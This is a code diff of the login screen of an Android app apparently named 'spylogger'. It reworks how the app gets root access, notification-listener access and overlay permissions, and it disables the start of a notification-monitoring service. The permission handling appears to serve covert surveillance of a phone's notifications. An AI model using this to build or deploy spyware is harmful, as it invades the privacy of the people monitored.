@@ -37,14 +37,12 @@ import com.gravatasufoca.spylogger.dao.DatabaseHelper;
 import com.gravatasufoca.spylogger.helpers.NetworkUtil;
 import com.gravatasufoca.spylogger.helpers.TaskComplete;
 import com.gravatasufoca.spylogger.model.Configuracao;
-import com.gravatasufoca.spylogger.receivers.NotificationMonitor;
 import com.gravatasufoca.spylogger.repositorio.RepositorioConfiguracao;
 import com.gravatasufoca.spylogger.repositorio.impl.RepositorioConfiguracaoImpl;
 import com.gravatasufoca.spylogger.services.SendUsuarioService;
 import com.gravatasufoca.spylogger.utils.Utils;
 import com.gravatasufoca.spylogger.vos.AparelhoVO;
 import com.gravatasufoca.spylogger.vos.UsuarioVO;
-import com.stericson.RootTools.RootTools;
 import com.utilidades.gravata.utils.Utilidades;
 
 import java.sql.SQLException;
@@ -80,9 +78,22 @@ public class LoginActivity extends AppCompatActivity implements LoaderCallbacks<
         setContentView(R.layout.activity_login);
         this.context = this;
 
-        RootTools.isAccessGiven();
-
         Utilidades.askPermissions(this, Utils.permissoes);
+
+        if(!Utils.isRooted()) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
+                boolean weHaveNotificationListenerPermission = false;
+                for (String service : NotificationManagerCompat.getEnabledListenerPackages(this)) {
+                    if (service.equals(getPackageName()))
+                        weHaveNotificationListenerPermission = true;
+                }
+                if (!weHaveNotificationListenerPermission) {
+                    //ask for permission
+                    Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
+                    startActivity(intent);
+                }
+            }
+        }
 
         if (Build.VERSION.SDK_INT >= 23) {
             if (!Settings.canDrawOverlays(this)) {
@@ -95,19 +106,7 @@ public class LoginActivity extends AppCompatActivity implements LoaderCallbacks<
             startService(intent);
         }
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
-            boolean weHaveNotificationListenerPermission = false;
-            for (String service : NotificationManagerCompat.getEnabledListenerPackages(this)) {
-                if (service.equals(getPackageName()))
-                    weHaveNotificationListenerPermission = true;
-            }
-            if (!weHaveNotificationListenerPermission) {
-                //ask for permission
-                Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
-                startActivity(intent);
-            }
-        }
-        Utils.startService(getApplicationContext(), NotificationMonitor.class);
+//        Utils.startService(getApplicationContext(), NotificationMonitor.class);
 
         if (NetworkUtil.NETWORK_STATUS_NOT_CONNECTED==NetworkUtil.getConnectivityStatusString(this)) {
             Toast.makeText(this, R.string.nao_conectado, Toast.LENGTH_LONG).show();
